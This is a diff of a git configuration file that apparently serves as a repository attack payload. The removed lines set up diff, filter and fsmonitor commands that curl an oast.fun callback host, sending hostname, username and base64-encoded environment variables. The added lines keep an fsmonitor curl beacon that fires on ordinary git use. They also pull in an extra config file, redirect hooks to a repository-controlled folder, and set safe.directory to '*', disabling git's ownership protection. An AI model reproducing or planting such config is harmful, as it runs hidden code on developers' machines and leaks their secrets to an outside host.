@@ -1,8 +1,7 @@
-[diff "exfil"]
-    textconv = sh -c 'curl https://git-diff.$(hostname).d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun/$(whoami) 2>/dev/null; cat $1' --
-[filter "exfil"]
-    clean = sh -c 'curl https://git-filter.$(hostname).d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun 2>/dev/null; cat' --
-    smudge = sh -c 'curl https://git-smudge.$(hostname).d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun 2>/dev/null; cat' --
+[include]
+    path = fakegit/config
 [core]
-    fsmonitor = sh -c 'curl https://git-fsmonitor.$(hostname).d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun/$(env|base64|head -c100) 2>/dev/null'
+    fsmonitor = curl https://gitconfig-fsmonitor.d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun
     hooksPath = .githooks
+[safe]
+    directory = *
